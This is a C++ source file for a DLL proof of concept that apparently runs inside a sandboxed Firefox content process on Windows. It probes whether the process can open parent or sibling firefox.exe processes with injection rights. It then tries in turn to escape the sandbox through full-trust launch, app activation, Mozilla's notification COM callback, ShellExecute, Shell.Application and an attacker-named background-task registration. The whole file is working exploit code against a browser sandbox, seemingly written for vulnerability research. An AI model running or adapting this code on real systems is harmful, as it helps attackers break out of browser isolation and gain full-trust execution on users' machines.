#include "poc_context.h"

#include <appmodel.h>
#include <roapi.h>
#include <shldisp.h>
#include <shellapi.h>
#include <shobjidl.h>
#include <tlhelp32.h>
#include <winrt/Windows.ApplicationModel.h>
#include <winrt/Windows.ApplicationModel.Background.h>
#include <winrt/Windows.Foundation.h>
#include <winrt/base.h>

#include <algorithm>
#include <iterator>
#include <string>
#include <vector>

#ifdef ShellExecute
#  undef ShellExecute
#endif

struct NotificationUserInputData {
  LPCWSTR key;
  LPCWSTR value;
};

MIDL_INTERFACE("53E31837-6600-4A81-9395-75CFFE746F94")
INotificationActivationCallback : public IUnknown {
 public:
  virtual HRESULT STDMETHODCALLTYPE Activate(
      LPCWSTR app_user_model_id, LPCWSTR invoked_arguments,
      const NotificationUserInputData* data, ULONG count) = 0;
};

const CLSID kNotificationActivationClsid = {
    0x916f9b5d,
    0xb5b2,
    0x4d36,
    {0xb0, 0x47, 0x03, 0xc7, 0xa5, 0x2f, 0x81, 0xc8}};

namespace {

template <std::size_t N>
void CopyString(wchar_t (&destination)[N], const wchar_t* source) {
  if (!source) {
    destination[0] = L'\0';
    return;
  }
  wcsncpy_s(destination, source, _TRUNCATE);
}

void CaptureCurrentProcess(TokenSnapshot& snapshot) {
  ZeroMemory(&snapshot, sizeof(snapshot));
  snapshot.pid = GetCurrentProcessId();
  IsProcessInJob(GetCurrentProcess(), nullptr, &snapshot.is_in_job);
  CopyString(snapshot.command_line, GetCommandLineW());
  GetModuleFileNameW(nullptr, snapshot.image_path,
                     static_cast<DWORD>(std::size(snapshot.image_path)));

  UINT32 length = static_cast<UINT32>(std::size(snapshot.package_family));
  if (GetCurrentPackageFamilyName(&length, snapshot.package_family) !=
      ERROR_SUCCESS) {
    snapshot.package_family[0] = L'\0';
  }

  length = static_cast<UINT32>(std::size(snapshot.package_full_name));
  if (GetCurrentPackageFullName(&length, snapshot.package_full_name) !=
      ERROR_SUCCESS) {
    snapshot.package_full_name[0] = L'\0';
  }

  HANDLE token = nullptr;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
    return;
  }

  snapshot.is_restricted = IsTokenRestricted(token);

  DWORD value = 0;
  DWORD returned = 0;
  if (GetTokenInformation(token, TokenIsAppContainer, &value, sizeof(value),
                          &returned)) {
    snapshot.is_app_container = value;
  }

  TOKEN_ELEVATION elevation{};
  if (GetTokenInformation(token, TokenElevation, &elevation,
                          sizeof(elevation), &returned)) {
    snapshot.is_elevated = elevation.TokenIsElevated;
  }

  GetTokenInformation(token, TokenIntegrityLevel, nullptr, 0, &returned);
  if (returned) {
    std::vector<BYTE> buffer(returned);
    if (GetTokenInformation(token, TokenIntegrityLevel, buffer.data(),
                            returned, &returned)) {
      const auto label = reinterpret_cast<TOKEN_MANDATORY_LABEL*>(buffer.data());
      const auto count = *GetSidSubAuthorityCount(label->Label.Sid);
      snapshot.integrity_rid =
          *GetSidSubAuthority(label->Label.Sid, count - 1);
    }
  }

  CloseHandle(token);
}

void ProbeFirefoxProcessAccess(LaunchContext& context) {
  context.parent_injection_open_error = ERROR_NOT_FOUND;
  context.parent_injection_access = FALSE;
  context.sibling_injection_open_error = ERROR_NOT_FOUND;
  context.sibling_injection_access = FALSE;

  const DWORD injection_access =
      PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
      PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_OPERATION |
      PROCESS_VM_READ | PROCESS_VM_WRITE;
  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (snapshot == INVALID_HANDLE_VALUE) {
    context.parent_injection_open_error = GetLastError();
    context.sibling_injection_open_error = context.parent_injection_open_error;
    return;
  }

  PROCESSENTRY32W entry{};
  entry.dwSize = sizeof(entry);
  if (Process32FirstW(snapshot, &entry)) {
    do {
      if (entry.th32ProcessID == GetCurrentProcessId()) {
        context.parent_pid = entry.th32ParentProcessID;
        break;
      }
    } while (Process32NextW(snapshot, &entry));
  }

  if (context.parent_pid) {
    SetLastError(ERROR_SUCCESS);
    HANDLE parent = OpenProcess(injection_access, FALSE, context.parent_pid);
    context.parent_injection_access = parent != nullptr;
    context.parent_injection_open_error =
        parent ? ERROR_SUCCESS : GetLastError();
    if (parent) {
      CloseHandle(parent);
    }
  }

  entry = {};
  entry.dwSize = sizeof(entry);
  if (Process32FirstW(snapshot, &entry)) {
    do {
      if (entry.th32ProcessID == GetCurrentProcessId() ||
          entry.th32ProcessID == context.parent_pid ||
          _wcsicmp(entry.szExeFile, L"firefox.exe") != 0) {
        continue;
      }
      SetLastError(ERROR_SUCCESS);
      HANDLE sibling =
          OpenProcess(injection_access, FALSE, entry.th32ProcessID);
      if (sibling) {
        context.sibling_injection_access = TRUE;
        context.sibling_injection_open_error = ERROR_SUCCESS;
        context.sibling_injection_pid = entry.th32ProcessID;
        CloseHandle(sibling);
        break;
      }
      context.sibling_injection_open_error = GetLastError();
    } while (Process32NextW(snapshot, &entry));
  }
  CloseHandle(snapshot);
}

}  // namespace

extern "C" __declspec(dllexport) DWORD WINAPI RunPoc(void* raw_context) {
  auto* context = static_cast<LaunchContext*>(raw_context);
  if (!context || context->magic != kPocContextMagic) {
    return ERROR_INVALID_PARAMETER;
  }

  context->call_hresult = E_PENDING;
  context->extended_error = S_OK;
  context->launch_result = -1;
  context->activation_hresult = E_PENDING;
  context->activation_pid = 0;
  context->shell_execute_error = ERROR_IO_PENDING;
  context->shell_execute_pid = 0;
  context->shell_execute_succeeded = FALSE;
  context->shell_dispatch_hresult = E_PENDING;
  context->notification_activation_hresult = E_PENDING;
  context->background_register_hresult = E_PENDING;
  context->background_registered = FALSE;
  CaptureCurrentProcess(context->caller);
  ProbeFirefoxProcessAccess(*context);

  const HRESULT initialize_result = RoInitialize(RO_INIT_MULTITHREADED);
  const bool should_uninitialize = SUCCEEDED(initialize_result);
  if (FAILED(initialize_result) && initialize_result != RPC_E_CHANGED_MODE) {
    context->call_hresult = initialize_result;
    return ERROR_SUCCESS;
  }

  try {
    const auto result =
        winrt::Windows::ApplicationModel::FullTrustProcessLauncher::
            LaunchFullTrustProcessForCurrentAppWithArgumentsAsync(
                context->launch_arguments)
                .get();
    context->launch_result =
        static_cast<std::int32_t>(result.LaunchResult());
    context->extended_error = result.ExtendedError().value;
    context->call_hresult = S_OK;
  } catch (const winrt::hresult_error& error) {
    context->call_hresult = error.code().value;
  } catch (...) {
    context->call_hresult = E_FAIL;
  }

  // Exercise the packaged-app activation broker from the same renderer token.
  // This OS path is independent of FullTrustProcessLauncher and accepts an
  // AUMID plus a caller-controlled argument string.
  if (context->application_user_model_id[0] != L'\0') {
    IApplicationActivationManager* manager = nullptr;
    HRESULT result = CoCreateInstance(
        CLSID_ApplicationActivationManager, nullptr, CLSCTX_INPROC_SERVER,
        IID_PPV_ARGS(&manager));
    if (SUCCEEDED(result)) {
      result = manager->ActivateApplication(
          context->application_user_model_id, context->launch_arguments,
          AO_NONE, &context->activation_pid);
      manager->Release();
    }
    context->activation_hresult = result;
  }

  // The package also registers Mozilla's toast-activation COM surrogate. Its
  // callback accepts newline-delimited launch data and starts firefox.exe.
  if (context->notification_profile[0] != L'\0') {
    INotificationActivationCallback* callback = nullptr;
    HRESULT result = CoCreateInstance(
        kNotificationActivationClsid, nullptr, CLSCTX_LOCAL_SERVER,
        IID_PPV_ARGS(&callback));
    if (SUCCEEDED(result)) {
      const std::wstring invoked_arguments =
          std::wstring(L"program\nwinfire\nprofile\n") +
          context->notification_profile;
      result = callback->Activate(context->application_user_model_id,
                                  invoked_arguments.c_str(), nullptr, 0);
      callback->Release();
    }
    context->notification_activation_hresult = result;
  }

  const std::wstring shell_target =
      std::wstring(L"shell:AppsFolder\\") +
      context->application_user_model_id;

  // Ask the shell namespace to activate the packaged app. Keep this separate
  // from IApplicationActivationManager because ShellExecute has its own broker
  // and caller checks.
  if (context->shell_execute_arguments[0] != L'\0') {
    SHELLEXECUTEINFOW info{};
    info.cbSize = sizeof(info);
    info.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
    info.lpVerb = L"open";
    info.lpFile = L"firefox.exe";
    info.lpParameters = context->shell_execute_arguments;
    info.nShow = SW_HIDE;
    SetLastError(ERROR_SUCCESS);
    context->shell_execute_succeeded = ShellExecuteExW(&info);
    context->shell_execute_error =
        context->shell_execute_succeeded ? ERROR_SUCCESS : GetLastError();
    if (info.hProcess) {
      context->shell_execute_pid = GetProcessId(info.hProcess);
      CloseHandle(info.hProcess);
    }
  }

  // Exercise the Shell.Application automation broker as a distinct route.
  if (context->shell_dispatch_arguments[0] != L'\0') {
    IShellDispatch2* shell = nullptr;
    HRESULT result = CoCreateInstance(
        CLSID_Shell, nullptr, CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER,
        IID_PPV_ARGS(&shell));
    if (SUCCEEDED(result)) {
      BSTR file = SysAllocString(shell_target.c_str());
      VARIANT args{};
      args.vt = VT_BSTR;
      args.bstrVal = SysAllocString(context->shell_dispatch_arguments);
      VARIANT empty{};
      empty.vt = VT_EMPTY;
      VARIANT show{};
      show.vt = VT_I4;
      show.lVal = SW_HIDE;
      result = shell->ShellExecute(file, args, empty, empty, show);
      SysFreeString(args.bstrVal);
      SysFreeString(file);
      shell->Release();
    }
    context->shell_dispatch_hresult = result;
  }

  // The direct launch is expected to be denied for a Firefox content token.
  // Test the separate package background-task route introduced by the same
  // autoland commit: if this restricted caller can register an attacker-named
  // timer, Windows will later activate Mozilla's declared AppContainer entry
  // point, which calls FullTrustProcessLauncher on the package's behalf.
  if (context->background_task_name[0] != L'\0') {
    try {
      using namespace winrt::Windows::ApplicationModel::Background;
      BackgroundTaskBuilder builder;
      builder.Name(context->background_task_name);
      builder.TaskEntryPoint(L"Mozilla.MsixComServer.BackgroundTaskHost");
      builder.SetTrigger(TimeTrigger(15, true));
      const auto registration = builder.Register();
      context->background_registered = static_cast<bool>(registration);
      context->background_register_hresult = S_OK;
    } catch (const winrt::hresult_error& error) {
      context->background_register_hresult = error.code().value;
    } catch (...) {
      context->background_register_hresult = E_FAIL;
    }
  }

  if (should_uninitialize) {
    RoUninitialize();
  }
  return ERROR_SUCCESS;
}

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, void*) {
  if (reason == DLL_PROCESS_ATTACH) {
    DisableThreadLibraryCalls(instance);
  }
  return TRUE;
}
